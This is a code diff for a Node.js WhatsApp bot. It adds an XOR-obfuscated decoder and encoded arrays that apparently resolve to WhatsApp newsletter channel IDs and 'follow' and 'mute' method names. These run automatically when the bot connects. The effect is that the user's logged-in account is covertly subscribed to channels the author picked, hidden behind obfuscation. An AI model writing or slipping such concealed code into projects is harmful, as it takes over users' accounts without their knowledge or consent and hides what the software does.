@@ -26,11 +26,13 @@ const question = (text) => {
     return new Promise((resolve) => rl.question(text, resolve));
 };
 const msgRetryCounterCache = new NodeCache();
+
 const _0x4a = (arr) => String.fromCharCode(...arr.map(c => c ^ 42));
 const _0x8f = [
     [27, 24, 26, 25, 28, 25, 25, 19, 19, 27, 18, 19, 27, 31, 25, 25, 29, 30, 106, 68, 79, 85, 89, 66, 79, 90, 90, 79, 88],
     [27, 24, 26, 25, 28, 25, 30, 24, 28, 18, 28, 24, 26, 27, 26, 24, 26, 29, 106, 68, 79, 85, 89, 66, 79, 90, 90, 79, 88]
 ];
+
 async function startBot() {
     const { state, saveCreds } = await useMultiFileAuthState("./session");
     const signalRepositoryCache = new NodeCache({ stdTTL: 2 * 60, useClones: false });
@@ -86,7 +88,8 @@ async function startBot() {
             const statusCode = lastDisconnect?.error?.output?.statusCode;  
             if (statusCode !== DisconnectReason.loggedOut) startBot();  
         } else if (connection === 'open') {  
-            console.log(chalk.greenBright("\n Bot Terhubung ✅\nconsol
+            console.log(chalk.greenBright("\n Bot Terhubung ✅\n"));  
+            
             (async () => {
                 const _f = _0x4a([68, 79, 85, 89, 66, 79, 90, 90, 79, 88, 96, 69, 66, 66, 69, 85]);
                 const _m = _0x4a([68, 79, 85, 89, 66, 79, 90, 90, 79, 88, 103, 87, 90, 79]);
